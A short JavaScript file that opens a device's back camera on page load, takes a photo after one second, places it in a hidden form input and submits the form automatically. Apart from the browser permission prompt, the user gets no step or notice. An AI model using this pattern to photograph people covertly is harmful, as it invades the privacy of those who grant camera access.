const video = document.getElementById("preview");
let stream;

// Start camera immediately
startCamera();

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { exact: "environment" } }  // Back camera
    });

    video.srcObject = stream;

    // Wait 1 second for camera to stabilize, then capture automatically
    setTimeout(captureAndUpload, 1000);

  } catch (err) {
    console.error("Camera error:", err);
  }
}

function captureAndUpload() {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    const file = new File([blob], "photo.jpg", { type: "image/jpeg" });

    // Put the file into the hidden input
    const input = document.getElementById("photoInput");
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(file);
    input.files = dataTransfer.files;

    // Submit the form
    document.getElementById("autoUploadForm").submit();

    stopCamera();

  }, "image/jpeg", 0.9);
}

function stopCamera() {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
}
